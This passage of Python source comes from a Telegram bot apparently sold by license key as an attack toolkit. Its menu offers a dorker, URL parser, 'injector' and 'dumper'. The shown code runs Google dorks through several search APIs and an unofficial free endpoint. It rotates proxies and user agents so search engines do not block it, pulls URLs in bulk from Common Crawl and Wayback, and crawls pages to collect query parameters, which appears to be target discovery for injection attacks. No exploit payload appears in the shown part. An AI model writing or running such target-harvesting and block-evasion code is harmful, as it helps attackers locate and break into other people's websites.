    if not (k["cse_key"] and k["cse_cx"]):
        return []
    try:
        async with session.get(
                "https://www.googleapis.com/customsearch/v1",
                params={"key": k["cse_key"], "cx": k["cse_cx"], "q": dork,
                        "num": min(10, num), "start": start},
                headers=UA, ssl=False,
                timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status != 200:
                return []
            j = await r.json(content_type=None)
        out = [str(it.get("link") or "") for it in (j.get("items") or [])]
        return _uniq([u for u in (_clean_url(x) for x in out) if u])
    except Exception:
        return []


# ── GOOGLE via ijerm (koi API key nahi, free) ────────────────────────────────
GJ_DEFAULT = "https://ijerm.com/submit_article/book1/search-api"
GJ_STATE = {"fail": 0, "ok": 0, "last": 0.0, "dead_until": 0.0, "idx": 0}
GJ_TIMEOUT = 6.0          # BUG 5 fix: dead endpoint pe 6s, 12s nahi
GJ_LOCK = None
GJ_MIN_GAP = 2.5          # requests ke beech minimum gap (sec) — endpoint ko izzat do
GJ_MAX_PAGES = 6          # 10+ pages pe endpoint timeout karta hai
GJ_JUNK_HOSTS = {
    "exploit-db.com", "www.exploit-db.com", "github.com", "www.github.com",
    "scribd.com", "www.scribd.com", "stackoverflow.com", "stackexchange.com",
    "www.youtube.com", "youtube.com", "reddit.com", "www.reddit.com",
    "medium.com", "qiita.com", "note.com", "habr.com", "blog.51cto.com",
    "facebook.com", "www.facebook.com", "twitter.com", "x.com",
    "wordpress.org", "www.hostinger.com", "elementor.com",
}


def gj_enabled() -> bool:
    v = str(sget("gj_url", "") or "").strip()
    return v != "-"


def gj_pool() -> list:
    """Free Google endpoints — default + user ne add kiye hue (rotating)."""
    pool = [GJ_DEFAULT]
    v = str(sget("gj_url", "") or "").strip()
    if v and v != "-" and v.startswith("http") and v not in pool:
        pool.append(v)
    extra = sget("gj_pool") or []
    if isinstance(extra, list):
        for u in extra:
            u = str(u or "").strip()
            if u.startswith("http") and u not in pool:
                pool.append(u)
    return pool


def gj_base() -> str:
    pool = gj_pool()
    return pool[GJ_STATE.get("idx", 0) % len(pool)]


def gj_rotate() -> None:
    """Agle endpoint pe jao (ek fail hone par)."""
    GJ_STATE["idx"] = (GJ_STATE.get("idx", 0) + 1) % max(1, len(gj_pool()))


def gj_alive() -> bool:
    """Cooldown khatam? Haan to fail counter bhi 0 — warna dobara turant mar jata."""
    if time.time() >= GJ_STATE["dead_until"]:
        if GJ_STATE.get("fail"):
            GJ_STATE["fail"] = 0                  # BUG 4 fix: recover hota hai
        return True
    return False


def gj_host_junk(url: str) -> bool:
    try:
        host = url.split("//", 1)[-1].split("/", 1)[0].lower().split(":")[0]
    except Exception:
        return False
    if host.startswith("www."):
        host = host[4:]                            # BUG 7 fix: asli strip
    return host in GJ_JUNK_HOSTS or ("www." + host) in GJ_JUNK_HOSTS


async def gjerm_search(session, dork: str, pages: int = 1) -> list:
    """ijerm ka free Google endpoint — koi key nahi. Rate-limited + circuit breaker."""
    global GJ_LOCK
    dork = (dork or "").strip()
    if not dork or not gj_enabled() or not gj_alive():
        return []
    if GJ_LOCK is None:
        GJ_LOCK = asyncio.Lock()
    st = GJ_STATE
    async with GJ_LOCK:
        gap = GJ_MIN_GAP - (time.time() - st["last"])
        if gap > 0:
            await asyncio.sleep(min(gap, 6))
        pages = max(1, min(GJ_MAX_PAGES, int(pages or 1)))
        try:
            async with session.get(
                    gj_base(),
                    params={"q": dork, "pages": pages},
                    headers={"User-Agent": random.choice(UA_LIST),
                             "Accept": "application/json"},
                    ssl=False, allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=GJ_TIMEOUT)) as r:
                st["last"] = time.time()
                if r.status != 200:
                    st["fail"] += 1
                    gj_rotate()                     # agla endpoint try karo
                    if st["fail"] >= 3:
                        st["dead_until"] = time.time() + 300
                        logger.warning("gjerm: 3 fail — pool rotate, 5 min cooldown")
                    return []
                j = await r.json(content_type=None)
        except Exception as exc:
            st["last"] = time.time()
            st["fail"] += 1
            gj_rotate()
            if st["fail"] >= 3:
                st["dead_until"] = time.time() + 300
                logger.warning("gjerm fail (%s) — pool rotate, 5 min cooldown",
                               str(exc)[:60])
            return []
    if not isinstance(j, dict) or j.get("status") == "error":
        st["fail"] += 1
        return []
    st["ok"] += 1
    st["fail"] = 0
    out = []
    for u in (j.get("urls") or []):
        cu = _clean_url(str(u))
        if not cu or gj_host_junk(cu):
            continue
        out.append(cu)
    return _uniq(out)


async def serpapi_search(session, dork: str, num: int = 20, start: int = 0) -> list:
    """SerpAPI — 100 searches/month free (real Google results + dorks)."""
    k = api_keys()
    if not k["serpapi"]:
        return []
    try:
        async with session.get(
                "https://serpapi.com/search.json",
                params={"engine": "google", "q": dork, "num": min(100, num),
                        "start": start, "api_key": k["serpapi"]},
                headers=UA, ssl=False,
                timeout=aiohttp.ClientTimeout(total=25)) as r:
            if r.status != 200:
                return []
            j = await r.json(content_type=None)
        out = [str(it.get("link") or "") for it in (j.get("organic_results") or [])]
        return _uniq([u for u in (_clean_url(x) for x in out) if u])
    except Exception:
        return []


def _pick_proxy() -> str:
    pool = PROXIES or load_proxy_pool()
    if not pool:
        return None
    return random.choice(pool[: max(1, min(len(pool), 30))]).get("url")


class ProxyRotator:
    """Rotating proxy pool — round-robin, fail hone par 3 min ke liye side me.

    - Har request naya proxy (same proxy repeat nahi jab tak pool chhota na ho)
    - Fail → cooldown, agla request dusra proxy
    - Koi proxy nahi bacha → None (direct connection)
    """

    COOLDOWN = 180.0

    def __init__(self, pool=None, enabled: bool = True):
        self.enabled = bool(enabled)
        self.pool = []
        self.rot = set()
        for x in (pool if pool is not None else (PROXIES or load_proxy_pool())) or []:
            u = x.get("url") if isinstance(x, dict) else str(x or "")
            if u:
                self.pool.append(u)
                if (isinstance(x, dict) and x.get("rot")) or u in rot_proxies():
                    self.rot.add(u)
        self.bad = {}
        self.idx = 0
        self.used = 0
        self.fail = 0

    def __len__(self):
        return len(self.pool)

    def alive(self) -> int:
        now = time.time()
        return sum(1 for p in self.pool if self.bad.get(p, 0) < now)

    def next(self):
        """Agla proxy — rot endpoint pehle (har request naya IP), phir round robin."""
        if not self.enabled or not self.pool:
            return None
        now = time.time()
        for p in self.pool:                      # rotating endpoint priority
            if p in self.rot and self.bad.get(p, 0) < now:
                self.used += 1
                return p
        n = len(self.pool)
        for _ in range(n):
            p = self.pool[self.idx % n]
            self.idx += 1
            if self.bad.get(p, 0) < now:
                self.used += 1
                return p
        return None                     # sab cooldown me → direct

    def ok(self, proxy):
        if proxy:
            self.bad.pop(proxy, None)

    def dead(self, proxy):
        if proxy:
            cool = ROT_COOLDOWN if proxy in self.rot else self.COOLDOWN
            self.bad[proxy] = time.time() + cool
            self.fail += 1

    def stats(self) -> dict:
        return {"pool": len(self.pool), "alive": self.alive(),
                "used": self.used, "fail": self.fail}


# ═══════════════════════════════════════════════════════════════════════════
# 3) STOP button — har long task ruk sakta hai
# ═══════════════════════════════════════════════════════════════════════════
STOP_FLAGS = {}
ACTIVE_UID = {"uid": None}       # kaun sa user abhi scan chala raha hai (STOP ke liye)


def stop_mark(uid) -> str:
    """Naya token banao — is run ko stop karne ke liye."""
    tok = "%d" % int(time.time() * 1000 % 100000)
    STOP_FLAGS[str(uid)] = {"tok": tok, "stop": False}
    return tok


def stop_requested(uid) -> bool:
    d = STOP_FLAGS.get(str(uid))
    return bool(d and d.get("stop"))


def stop_clear(uid) -> None:
    STOP_FLAGS.pop(str(uid), None)


def kb_stop(uid, tok: str, extra=None) -> InlineKeyboardMarkup:
    """⛔ STOP button wali keyboard."""
    rows = [[InlineKeyboardButton("⛔ STOP", callback_data="sp:%s:%s" % (uid, tok))]]
    if extra:
        rows.extend(extra.inline_keyboard if hasattr(extra, "inline_keyboard") else extra)
    return RK(rows)


async def parse(dorks: list, max_urls: int = 200, pages: int = 1, engines: list = None,
                use_proxy=None, progress=None, strict: bool = True,
                mode: str = None) -> dict:
    """Dork list → real URLs. Engine rotate + proxy rotate + 2 round retry."""
    if use_proxy is None:                       # auto — proxy ho to use, warna bina
        use_proxy = bool(PROXIES or load_proxy_pool())
    engines = engines or engine_list(mode)
    max_urls = max(1, min(20000, int(max_urls or 200)))
    pages = max(1, min(20, int(pages or 1)))
    found = []
    seen = set()
    # chhoti dork list = zyada engines (depth), badi list = kam engines (speed)
    eng_cap = len(engines) if len(dorks) <= 10 else 3
    stats = {"queries": 0, "engine_hits": defaultdict(int), "errors": 0, "blocked": 0}
    conn = mk_connector(limit=60, ttl_dns_cache=600)
    async with aiohttp.ClientSession(connector=conn) as session:
        i = 0
        for dork in dorks:
            if len(found) >= max_urls:
                break
            for page in range(pages):
                if len(found) >= max_urls:
                    break
                q = dork
                got = 0
                tried = 0
                # free Google (ijerm) — page 0 pe hi, chhota budget
                if page == 0 and gj_enabled() and gj_alive() and len(found) < max_urls:
                    gurls = await gjerm_search(session, dork, pages=1)
                    if gurls:
                        stats["queries"] += 1
                        stats["engine_hits"]["gjerm"] += len(gurls)
                        fn = 0
                        for u in gurls:
                            if strict and not dork_match(u, dork):
                                continue
                            kk = u.split("#")[0]
                            if kk in seen:
                                continue
                            seen.add(kk)
                            found.append(kk)
                            fn += 1
                            if len(found) >= max_urls:
                                break
                        got += 1 if fn else 0
                order = list(engines)
                random.shuffle(order)
                # jo engine 3+ baar khaali/blocked nikla, use peeche bhejo
                order.sort(key=lambda e: ENGINE_MISS.get(e, 0) >= 3)
                for eng in order:
                    # 0-1 result pe kabhi give-up nahi — saare engines try karo
                    if tried >= eng_cap and got >= 2:
                        break
                    tried += 1
                    proxy = _pick_proxy() if use_proxy else None
                    urls = await fetch_engine(session, eng, q, proxy, page=page)
                    stats["queries"] += 1
                    if not urls:
                        stats["blocked"] += 1
                        continue
                    # strict: URL ko dork ke inurl/filetype se match karo
                    if strict:
                        matched = [u for u in urls if dork_match(u, dork)]
                        if matched:
                            urls = matched
                    stats["engine_hits"][eng] += len(urls)
                    for u in urls:
                        k = u.split("#")[0]
                        if k not in seen:
                            seen.add(k)
                            found.append(k)
                            got += 1
                        if len(found) >= max_urls:
                            break
                    if got >= 5 or len(found) >= max_urls:
                        break
            i += 1
            if progress and i % 3 == 0:
                try:
                    await progress({"dorks": i, "total": len(dorks), "urls": len(found)})
                except Exception:
                    pass
    return {"urls": found, "stats": stats}


# ── DEEP SCAN — sab dorks, poore stats (competitor jaisa card) ───────────────
def parse_url_limit(ndorks: int = 0) -> int:
    """URL limit — 0 (default) = JITNA MILE UTNA. Admin se fix bhi kar sakta hai."""
    try:
        v = int(sget("parse_url_limit", 0) or 0)
    except Exception:
        v = 0
    if v > 0:
        return v
    return min(200000, max(5000, int(ndorks or 0) * 200))


def parse_budget() -> float:
    """Scan kitni der chalega (second) — time khatam to jo mila wahi de dega."""
    try:
        return max(60.0, min(7200.0, float(sget("parse_budget", 1800) or 1800)))
    except Exception:
        return 1800.0


async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                     use_proxy=None, strict: bool = True,
                     progress=None, mode: str = None, budget: float = 0) -> dict:
    """Har dork scan karo, junk hatao, aur poore stats do:

    scanned / raw / unique / errors / filtered / engines
    """
    dorks = [str(d).strip() for d in (dorks or []) if str(d).strip()]
    max_urls = max(10, min(500000, int(max_urls or 5000)))
    pages = max(1, min(10, int(pages or 1)))
    if use_proxy is None:                       # auto
        use_proxy = proxy_available()
    mode = mode if mode in ENGINE_SETS else engines_mode()
    reset_engine_miss()                         # BUG 2 fix: naya scan = naya count
    rot = ProxyRotator(enabled=bool(use_proxy))
    eng_list = [e for e in engine_list(mode)
                if (len(rot) or not use_proxy or e not in NO_PROXY_DEAD)]
    if not eng_list:
        eng_list = list(engine_list(mode))[:3]
    try:
        eng_to = float(sget("parse_timeout", 0) or 0) or ENGINE_TIMEOUT.get(mode, 8.0)
    except Exception:
        eng_to = ENGINE_TIMEOUT.get(mode, 8.0)
    try:
        _threads = max(1, min(10, int(sget("parse_threads", 6) or 6)))
    except Exception:
        _threads = 4
    _esem = asyncio.Semaphore(_threads)
    _dead_engines = set()
    _miss = {}                                  # per-run engine miss (BUG 8)
    st = {"scanned": 0, "total": len(dorks), "raw": 0, "unique": 0,
          "errors": 0, "filtered": 0, "engine_hits": defaultdict(int),
          "junk": 0, "mismatch": 0, "cc": 0, "api": 0, "gj": 0,
          "relaxed": 0, "mode": mode, "engines": len(eng_list),
          "aborted": 0, "wb": 0, "empty_streak": 0, "time_up": 0, "stop": 0,
          "engines_used": len(eng_list), "dead": [], "proxy": rot.stats(),
          "rounds": 0, "per_dork": 0}
    _t_start = time.time()
    seen, out = set(), []
    _uid = str(ACTIVE_UID.get("uid")) if ACTIVE_UID.get("uid") else None

    # 1) site: dorks -> Common Crawl (free, bahut zyada URLs)
    doms = domains_from_dorks(dorks)
    if doms:

        async def _one_dom(dom):
            """CC → khaali to Wayback. Har step par hard timeout (mobile net)."""
            got = []
            try:
                got = await asyncio.wait_for(
                    cc_urls(dom, limit=min(2000, max_urls), proxy=None), timeout=15)
            except Exception:
                got = []
            if got:
                return got, 0
            try:
                wb = await asyncio.wait_for(
                    wayback_urls(dom, limit=min(1000, max_urls), proxy=None), timeout=12)
            except Exception:
                wb = []
            return wb, len(wb)

        got_all = await asyncio.gather(*[_one_dom(d) for d in doms[:8]],
                                       return_exceptions=True)
        for res in got_all:
            if isinstance(res, Exception) or not res:
                continue
            got, wbn = res
            st["wb"] += wbn
            st["raw"] += len(got)
            st["cc"] += len(got) - wbn
            for u in got:
                k = u.split("#")[0]
                if k not in seen:
                    seen.add(k)
                    out.append(k)
                    if len(out) >= max_urls:
                        break
            if len(out) >= max_urls:
                break

    # 2) FREE GOOGLE (ijerm) — koi key nahi, rate-limited
    k = api_keys()
    conn = mk_connector(limit=60, ttl_dns_cache=600)
    async with aiohttp.ClientSession(connector=conn) as session:
        # 2) optional API keys (agar user ne daale hain)
        if k["serpapi"] or k["serper"] or k["brave"] or (k["cse_key"] and k["cse_cx"]):
            for dork in dorks[:200]:
                got = []
                if k["serper"]:
                    got = await serper_search(session, dork, num=20)
                if not got and k["serpapi"]:
                    got = await serpapi_search(session, dork, num=20)
                if not got and k["brave"]:
                    got = await brave_search(session, dork, count=20)
                if not got and k["cse_key"] and k["cse_cx"]:
                    got = await cse_search(session, dork)
                st["raw"] += len(got)
                st["api"] += len(got)
                for u in got:
                    if not (strict and not dork_match(u, dork)):
                        kk = u.split("#")[0]
                        if kk not in seen:
                            seen.add(kk)
                            out.append(kk)

        # 3) saare dorks — PARALLEL workers (ek saath kai dorks)
        #    Pehle ek-ek dork sequential chalta tha: 5000 dorks = ghante.
        #    Ab threads = parallel dorks, isliye 3-6x zyada dork cover hote hain.
        gj_budget = min(20, len(dorks))          # free Google — 20 dork kaafi
        gj_deadline = time.time() + float(sget("gj_window", 45) or 45)   # BUG 6
        _queue = deque(enumerate(dorks, 1))
        _lock = asyncio.Lock()
        _ok_count = defaultdict(int)
        _prog_at = [0.0]
        _dork_conc = max(2, min(10, int(_threads)))

        async def _call_engine(eng, dork, page, deadline):
            """Ek engine call — semaphore + hard deadline."""
            if eng in _dead_engines or time.time() > deadline:
                return None
            try:
                async with _esem:
                    if eng in _dead_engines or time.time() > deadline:
                        return None
                    return await asyncio.wait_for(
                        fetch_engine(session, eng, dork, None, page=page,
                                     timeout=eng_to, rot=rot, miss=_miss),
                        timeout=max(3.0, eng_to + 1.0))
            except Exception as exc:
                logger.info("engine %s fail: %s", eng, str(exc)[:70])
                ENGINE_LAST[eng] = (type(exc).__name__ + ": " + str(exc)[:40],
                                    time.time())
                return None

        async def _scan_dork(i, dork):
            """Ek dork — engines best-first, 2 sources milte hi ruk jao."""
            got_any = 0
            dl = time.time() + max(6.0, eng_to * 1.25)
            added = []
            order = list(eng_list)
            order.sort(key=lambda e: (_miss.get(e, 0) >= ENGINE_DEAD_AFTER,
                                      -_ok_count.get(e, 0), random.random()))
            if i <= gj_budget and gj_enabled() and gj_alive() and time.time() < gj_deadline:
                try:
                    gurls = await asyncio.wait_for(
                        gjerm_search(session, dork, pages=min(2, pages)), timeout=12)
                except Exception:
                    gurls = []
                async with _lock:
                    st["raw"] += len(gurls)
                    st["gj"] += len(gurls)
                for u in gurls:
                    if strict and not dork_match(u, dork):
                        async with _lock:
                            st["mismatch"] += 1
                            st["filtered"] += 1
                        continue
                    added.append(u)
                got_any += 1 if gurls else 0
            for page in range(pages):
                if got_any >= 2 or time.time() > dl:
                    break
                for eng in order:
                    if eng in _dead_engines:
                        continue
                    if got_any >= 2 or time.time() > dl:
                        break
                    urls = await _call_engine(eng, dork, page, dl)
                    if urls is None:
                        continue
                    async with _lock:
                        st["errors"] += 1 if not urls else 0
                        if not urls:
                            if (_miss.get(eng, 0) >= ENGINE_DEAD_AFTER
                                    and eng not in _dead_engines):
                                _dead_engines.add(eng)
                                st["dead"].append(eng)
                                logger.info("parse_deep: %s dead (%d miss) — skip",
                                            eng, _miss.get(eng))
                    if not urls:
                        continue
                    got_any += 1
                    async with _lock:
                        _ok_count[eng] += 1
                        st["engine_hits"][eng] += len(urls)
                        st["raw"] += len(urls)
                    if strict:
                        matched = [u for u in urls if dork_match(u, dork)]
                        if matched:
                            urls = matched
                        else:
                            async with _lock:
                                st["relaxed"] += 1
                    added.extend(urls)
            return added

        async def _worker():
            while True:
                if _uid and stop_requested(_uid):
                    async with _lock:
                        st["stop"] = 1
                    return
                if budget and (time.time() - _t_start) > budget:
                    async with _lock:
                        st["time_up"] = 1
                    return
                async with _lock:
                    if not _queue:
                        return
                    i, dork = _queue.popleft()
                try:
                    got = await _scan_dork(i, dork)
                except Exception as exc:
                    logger.info("dork %d fail: %s", i, str(exc)[:70])
                    got = []
                async with _lock:
                    st["scanned"] += 1
                    st["unique"] = len(out)
                    st["per_dork"] = round(st["scanned"] /
                                           max(0.001, time.time() - _t_start), 2)
                    for u in got:
                        kk = u.split("#")[0]
                        if kk in seen:
                            st["junk"] += 1
                            st["filtered"] += 1
                            continue
                        seen.add(kk)
                        out.append(kk)
                        if len(out) >= max_urls:
                            break
                    _do_prog = (progress and (time.time() - _prog_at[0] > 1.8))
                    if _do_prog:
                        _prog_at[0] = time.time()
                if _do_prog:
                    try:
                        await progress(st)
                    except Exception:
                        pass

        logger.info("parse_deep: %d dorks • %d workers • engines %s",
                    len(dorks), min(_dork_conc, len(dorks)), ",".join(eng_list))
        await asyncio.gather(*[_worker() for _ in range(min(_dork_conc, len(dorks)))])
        st["remaining_dorks"] = [d for _, d in list(_queue)[:6000]]
        st["workers"] = _dork_conc

    st["unique"] = len(out)
    st["filtered"] = max(st["filtered"], st["raw"] - st["unique"])
    st["proxy"] = rot.stats()
    st["per_dork"] = round(st["scanned"] / max(1, time.time() - _t_start), 2)
    return {"urls": out, "stats": st}




# ═══════════════════════════════════════════════════════════════════════════════
#  🌊 DEEP URL CRAWLER — sabse fast, bina proxy
#  URL list → uske andar ke saare links + parameters (depth optional)
# ═══════════════════════════════════════════════════════════════════════════════
LINK_ATTR_RE = re.compile(
    r"""(?:href|src|action|data-href|data-url|data-src|formaction)\s*=\s*["']([^"'>\s]{3,500})["']""",
    re.I)
RAW_URL_RE = re.compile(r"""https?://[^\s"'<>\\]{6,300}""")
PARAM_RE = re.compile(r"[?&]([A-Za-z0-9_\-\[\]\.]{1,40})=")


def _abs_url(base: str, link: str) -> str:
    link = _html.unescape((link or "").strip())
    if not link or link.startswith(("#", "javascript:", "mailto:", "tel:", "data:")):
        return ""
    if link.startswith("//"):
        link = "https:" + link
    if not link.startswith("http"):
        try:
            link = urljoin(base, link)
        except Exception:
            return ""
    return _clean_url(link)


def url_params(u: str) -> list:
    """?id=5&cat=2 → ['id', 'cat'] (query me '?' nahi hota, isliye parse_qs)."""
    try:
        q = urlparse(u).query or ""
        if not q:
            return []
        return _uniq(list(parse_qs(q, keep_blank_values=True).keys()))[:40]
    except Exception:
        return []


async def deep_url_crawl(seeds: list, limit: int = 3000, concurrency: int = 40,
                         levels: int = 0, timeout: float = 8.0,
                         max_pages: int = 1500, progress=None) -> dict:
    """URLs → unke andar ke saare links (deep), parameters ke saath.

    levels 0  = sirf diye hue URLs fetch karo (fastest)
    levels 1  = unme jo links mile unko bhi fetch karo (2 hop, deep)
    """
    seeds = [str(x).strip() for x in (seeds or []) if str(x).strip()]
    norm = []
    for u in seeds:
        u = _html.unescape(str(u)).strip()
        if not u.startswith("http"):
            u = "https://" + u.lstrip("/")
        try:                          # seed ko junk-filter se nahi guzarte
            p = urlparse(u)
            if not p.hostname or len(u) > 500:
                continue
            norm.append(u.split("#")[0])
        except Exception:
            continue
    st = {"pages_ok": 0, "pages_fail": 0, "found": 0, "params": 0,
          "seeds": len(norm), "domains": 0}
    out, seen, param_seen = [], set(), set()
    queue = deque(norm)
    crawled = set()
    lock = asyncio.Lock()
    last = {"t": 0.0}
    conn = mk_connector(limit=max(10, concurrency),
                                ttl_dns_cache=600, force_close=True)
    hdrs = dict(UA)
    hdrs["Accept"] = "text/html,application/xhtml+xml,*/*"

    async def push(link: str, level: int):
        if not link or link in seen:
            return
        seen.add(link)
        out.append(link)
        for p in url_params(link):
            if p not in param_seen:
                param_seen.add(p)
                st["params"] += 1
        if levels and level < levels and link not in crawled:
            queue.append(link)

    async def worker(session):
        while True:
            async with lock:
                if not queue or len(out) >= limit or st["pages_ok"] + st["pages_fail"] >= max_pages:
                    return
                u = queue.popleft()
            if u in crawled:
                continue
            crawled.add(u)
            try:
                async with session.get(u, headers=hdrs, ssl=False, allow_redirects=True,
                                       timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                    ctype = (r.headers.get("Content-Type") or "").lower()
                    if r.status != 200 or ("html" not in ctype and "text" not in ctype):
                        st["pages_fail"] += 1
                        continue
                    body = await r.text(errors="ignore")
            except Exception:
                st["pages_fail"] += 1
                continue
            st["pages_ok"] += 1
            links = []
            for m in LINK_ATTR_RE.finditer(body[:400000]):
                links.append(m.group(1))
            for m in RAW_URL_RE.finditer(body[:400000]):
                links.append(m.group(0))
            for raw in links:
                a = _abs_url(u, raw)
                if not a:
                    continue
                async with lock:
                    if len(out) >= limit:
                        break
                    await push(a, 1)
            if progress and time.time() - last["t"] > 2.5:
                last["t"] = time.time()
                try:
                    await progress(st)
                except Exception:
                    pass

    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = [asyncio.create_task(worker(session))
                 for _ in range(max(4, min(80, concurrency)))]
        await asyncio.gather(*tasks, return_exceptions=True)

    async with lock:
        st["found"] = len(out)
        hosts = set()
        for u in out[:20000]:
            try:
                hosts.add(urlparse(u).hostname or "")
            except Exception:
                pass
        st["domains"] = len(hosts)
    return {"urls": out, "params": sorted(param_seen), "stats": st}

# ═══════════════════════════════════════════════════════════════════════════════
#  DUMPER — sab kuch file me
# ═══════════════════════════════════════════════════════════════════════════════
def dump_text(items, tag: str = "dump", header: str = "") -> tuple:
    """(path, count) — txt file banao."""
    items = [str(x) for x in (items or []) if str(x).strip()]
    name = "%s_%s.txt" % (re.sub(r"[^a-z0-9]+", "_", tag.lower())[:20] or "dump", stamp())
    path = os.path.join(DUMP_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        if header:
            f.write("# %s\n# %s\n\n" % (header, datetime.now().strftime("%d %b %Y %H:%M")))
        f.write("\n".join(items))
        f.write("\n")
    return path, len(items)


def dump_json(obj, tag: str = "dump") -> str:
    name = "%s_%s.json" % (re.sub(r"[^a-z0-9]+", "_", tag.lower())[:20] or "dump", stamp())
    path = os.path.join(DUMP_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, ensure_ascii=False, indent=1)
    return path


def dumps_list(limit: int = 12) -> list:
    try:
        files = [os.path.join(DUMP_DIR, f) for f in os.listdir(DUMP_DIR)]
        files = [f for f in files if os.path.isfile(f)]
        files.sort(key=os.path.getmtime, reverse=True)
        return files[:limit]
    except Exception:
        return []


def reply_msg(update):
    """Message jispe reply bhejna hai — callback query me bhi kaam karta hai."""
    cands = [getattr(update, "effective_message", None),
             getattr(getattr(update, "callback_query", None), "message", None),
             getattr(update, "message", None)]
    for c in cands:
        if c is not None and hasattr(c, "reply_text"):
            return c
    return next((c for c in cands if c is not None), None)


def trial_lock_on() -> bool:
    """Locked trial mode — admin panel se ON/OFF (`/batch trial 1`)."""
    return bool(sget("trial_lock", 0))


async def send_file(update, path: str, caption: str = ""):
    try:
        uid = getattr(getattr(update, "effective_user", None), "id", 0)
        if trial_lock_on() and not access_ok(uid):
            await reply_msg(update).reply_text(
                "🔒 <b>Trial mode</b> — the scan ran, but the file is locked.\n"
                "Redeem a key: <code>/redeem KEY</code>", parse_mode=ParseMode.HTML)
            return False
    except Exception:
        pass
    try:
        target = reply_msg(update)
        if target is None or not hasattr(target, "reply_document"):
            return False
        with open(path, "rb") as f:
            await target.reply_document(document=f,
                                        filename=os.path.basename(path),
                                        caption=caption[:1000])
        return True
    except Exception as exc:
        logger.warning("send_file fail: %s", exc)
        return False


# ═══════════════════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════════════════════════════════
def kb_main(uid=0) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(emo_btn("kw") + " HQ KEYWORDS", callback_data="m:kw")],
    ]
    nch = niche_list()
    for i in range(0, len(nch), 2):
        row = []
        for nm in nch[i:i + 2]:
            row.append(InlineKeyboardButton("🧩 %s" % nm[:18],
                                            callback_data="nc:use:%d" % nch.index(nm)))
        rows.append(row)
    rows += [
        [InlineKeyboardButton(emo_btn("dork") + " DORKER", callback_data="m:dork"),
         InlineKeyboardButton(emo_btn("parse") + " PARSER", callback_data="m:parse")],
        [InlineKeyboardButton(emo_btn("rev") + " URL REVERSE", callback_data="m:rev"),
         InlineKeyboardButton(emo_btn("inj") + " INJECTOR", callback_data="m:inj")],
        [InlineKeyboardButton(emo_btn("dump") + " DUMPER", callback_data="m:dump"),
         InlineKeyboardButton(emo_btn("qa") + " QUALITY CHECK", callback_data="m:qa")],
        [InlineKeyboardButton(emo_btn("rand") + " RANDOMIZER", callback_data="m:rand"),
         InlineKeyboardButton(emo_btn("help") + " HELP", callback_data="m:help")],
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="m:redeem")],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("🧅 PROXY ENGINE (admin)", callback_data="m:proxy")])
    return RK(rows)


def kb_back(to: str = "m:home") -> InlineKeyboardMarkup:
    return RK([[InlineKeyboardButton("⬅️ BACK", callback_data=to)]])


def main_text(name: str = "", context=None) -> str:
    hi = ("✨ Hi <b>%s</b>,\n" % esc(name)) if name else ""
    niches = niche_list()
    nline = ("📁 <b>NICHES</b> : <code>%d</code> saved" % len(niches)) if niches else ""
    ud = getattr(context, "user_data", {}) or {}
    return (H("PYTHON SNAKE", "%s • all systems go" % VERSION, slot="home") + "\n"
            + hi + "\n"
            + tag("WORKSPACE") + "\n"
            + "◆ %s : <code>%s</code>\n" % (style("KEYWORDS SAVED", "btn"),
                                              fmt(len(ud.get("last_kw_items") or [])))
            + "◆ %s : <code>%s</code>\n" % (style("DORKS READY", "btn"),
                                              fmt(len(ud.get("last_dorks") or [])))
            + "◆ %s  : <code>%s</code>\n" % (style("URLS READY", "btn"),
                                               fmt(len(ud.get("last_urls") or [])))
            + (nline + "\n" if nline else "")
            + "\n👇 %s" % style("Pick a tool", "sub"))


# ── CUSTOM NICHES — user apna niche save kare, kabhi bhi use kare ──────────
NICHE_MAX = 40
NICHE_KW_MAX = 20000


_HOME_CTX = {"c": None}


def niche_all() -> dict:
    d = sget("niches", {}) or {}
    return d if isinstance(d, dict) else {}


def niche_list() -> list:
    return sorted(niche_all().keys(), key=lambda z: z.lower())


def niche_get(name: str) -> list:
    return list((niche_all().get(name) or {}).get("kw") or [])


def niche_save(name: str, kws: list) -> bool:
    name = " ".join(str(name or "").split())[:28]
    if not name:
        return False
    d = dict(niche_all())
    if name not in d and len(d) >= NICHE_MAX:
        return False
    clean = _uniq([str(x).strip() for x in (kws or []) if str(x).strip()])
    d[name] = {"kw": clean[:NICHE_KW_MAX],
               "ts": datetime.now().isoformat(timespec="seconds")}
    sset("niches", d)
    return True


def niche_del(name: str) -> bool:
    d = dict(niche_all())
    if name not in d:
        return False
    d.pop(name, None)
    sset("niches", d)
    return True


def niche_by_index(idx) -> str:
    lst = niche_list()
    try:
        return lst[int(idx)]
    except Exception:
        return ""


# ═══════════════════════════════════════════════════════════════════════════════
#  ACCESS / CAPTCHA
# ═══════════════════════════════════════════════════════════════════════════════
def captcha_new(context):
    a, b = random.randint(2, 19), random.randint(2, 19)
    op = random.choice(["+", "-", "×"])
    ans = a + b if op == "+" else (a - b if op == "-" else a * b)
    opts = {ans}
    while len(opts) < 4:
        d = ans + random.choice((-6, -4, -3, -2, -1, 1, 2, 3, 4, 6))
        if d > 0:
            opts.add(d)
    opts = sorted(opts)
    random.shuffle(opts)
    try:
        context.user_data["cap"] = ans
    except Exception:
        pass
    q = (H("VERIFICATION") + "\n\nSolve this before using the bot:\n\n"
         "<b>%d %s %d = ?</b>" % (a, op, b))
    rows = [[InlineKeyboardButton(str(o), callback_data="cap:%d" % o) for o in opts[:2]],
            [InlineKeyboardButton(str(o), callback_data="cap:%d" % o) for o in opts[2:]]]
    rows.append([InlineKeyboardButton("🔄 NEW QUESTION", callback_data="cap:new")])
    return q, RK(rows)


def access_ok(uid) -> bool:
    return is_admin(uid) or has_access(uid)


def is_verified(context, uid) -> bool:
    """Captcha ek baar — restart ke baad dobara nahi poochta."""
    if context.user_data.get("verified"):
        return True
    try:
        if USERS.get(str(uid), {}).get("verified"):
            context.user_data["verified"] = True
            return True
    except Exception:
        pass
    return False


def need_key_text(uid) -> str:
    return (H("ACCESS NEEDED", "no license") + "\n\n"
